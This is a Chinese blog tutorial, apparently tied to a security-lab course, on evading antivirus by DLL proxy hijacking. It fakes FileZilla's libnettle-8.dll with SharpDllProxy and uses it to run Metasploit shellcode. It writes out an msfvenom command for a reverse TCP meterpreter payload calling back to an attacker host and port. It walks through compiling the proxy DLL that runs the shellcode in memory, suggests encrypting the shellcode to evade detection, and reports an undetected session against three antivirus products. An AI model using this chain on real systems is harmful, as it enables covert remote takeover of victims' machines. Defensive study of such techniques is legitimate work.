本文首发于“合天网安实验室” 作者：unihac

最近看了一些免杀，这一篇小白文章，大佬绕过。知识按照自己的知识整理和写出来的。

本文涉及知识点实操练习——[实验:特征码免杀MYCCL应用(合天网安实验室)](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014051614203800001&pk_campaign=freebuf-wemedia)

通过本实验的学习掌握特征码免杀技术。

DLL劫持

再Windows 7
版本之后，系统采用了KnowDLLs对DLL进行管理，其位于注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session
Manager\KnownDLLs下，在这个下面的DLL文件会被禁止从exe自身所在的目录下调用，而只能从系统目录(System32)目录下调用。但不是所有的dll都会被写入这个注册表，因此就会产生DLL劫持。

使用msfvenom生成的dll直接秒杀。![](https://image.3001.net/images/20201124/1606209759_5fbcd0dfeeb6de82e6f1e.png!small)

SharpDllProxy

听名字大概类似于socks代理一样。工具来源自：https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/。具体实现还可以参考这篇大佬的[博客](https://www.cnblogs.com/ndyxb/p/12906164.html).

前言

先理解下动态链接库的运行原理。如果应用程序A要使用动态链接库DataFunctions.dll里面的GetFunkyData()函数，就需要加载DataFunctions.dll动态链接库。这个工具就是出于这一点考虑，创建一个名字一模一样的DataFunction.dll动态链接库，他的功能有两个：①做个快捷键，将所有的功能转发到千真万确的动态链接库DataFunctions.dll，这就是名字中proxy的由来；②在这个假冒的DataFunctions.dll里面写入shellcode。附上作者原图：![](https://image.3001.net/images/20201124/1606209768_5fbcd0e8d730150b3d115.png!small)

实验过程

目标程序

花费了些时间搞这实验，例如FileZilla软件，怎么去找这个需要加载的dll呢？如作者说的，把该软件拷贝出去就知道他缺什么了。如下：![](https://image.3001.net/images/20201124/1606209777_5fbcd0f1520829660214c.png!small)

![](https://image.3001.net/images/20201124/1606209786_5fbcd0fa9aa708c2e124b.png!small)

那就说明运行改应用程序需要加载该DLL文件，那就针对这个DLL做一个假的libnettle-8.dll。

生成shellcode

msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.124.29
LPORT=4444 -f raw > shell.bin

实验开始

首先下载SharpDllProxy：https://github.com/Flangvik/SharpDllProxy，然后使用visual studio
2019对其进行编译，尽量不要使用其他版本，因为我用了下visual studio 2017各种报错搞了半天没搞出来，也可能环境有问题。

直接使用 vs 打开 文件下的SharpDllProxy --》
生成解决方案![](https://image.3001.net/images/20201124/1606209811_5fbcd1134dc4c82144e09.png!small)![](https://image.3001.net/images/20201124/1606209822_5fbcd11e545551744781e.png!small)

使用SharpDllProxy.dll生成一个假冒的libnettle-8.dll。将shell.bin和需要被假冒的Dll放到上图的文件中。执行如下命令：.\SharpDllProxy.exe
--dll libnettle-8.dll --payload
shell.bin![](https://image.3001.net/images/20201124/1606209831_5fbcd127a25dd6f5c97df.png!small)

生成的文件包含了一个C文件和一个dll，这个dll文件就是原来的 libnettle-8.dll
文件。![](https://image.3001.net/images/20201124/1606209840_5fbcd130bc60587654f90.png!small)

来分析下这个C语言程序，从第9行到494行都是转发DLL的函数，将所有需要运行函数转发原来的DLL，让其进行处理。![](https://image.3001.net/images/20201124/1606209849_5fbcd139694159190a80b.png!small)

到了497行就是我们插入的shellcode的地方。重点代码也就只有这么一点，其实还可以直接把shell.bin这个shellcode写入到该文件，就减少了文件可疑文件数量。这里是按照二进制的方式读入然后使用VirtualAlloc内存操作执行shellcode。到这里就可以自己一顿操作猛如虎，各种免杀姿势用上来，例如换个加载方式，如对shellcode先加密然后解密运行。![](https://image.3001.net/images/20201124/1606209860_5fbcd144663b04bf99bf9.png!small)

使用 VS 编译上面的C文件。文件---》新建---》项目---》动态链接库--》项目名为
libnettle-8。复制上面的C文件代码到VS中编译![](https://image.3001.net/images/20201124/1606209869_5fbcd14da12cbc625b33c.png!small)![](https://image.3001.net/images/20201124/1606209877_5fbcd155ee75a72500e1e.png!small)

将上面的三个文件（tmpD475.dll、libnettle-8.dll、shell.bin），发送到目标系统中。使用msf监听，然后运行程序，就已经返回会话了。![](https://image.3001.net/images/20201124/1606209886_5fbcd15ee7bef84a07a2e.png!small)![](https://image.3001.net/images/20201124/1606209894_5fbcd1665a57cbe38a2da.png!small)

使用最常用的杀毒软件：360、火绒和安全管家都没有被发现。![](https://image.3001.net/images/20201124/1606209905_5fbcd17156ea6fa754e03.png!small)

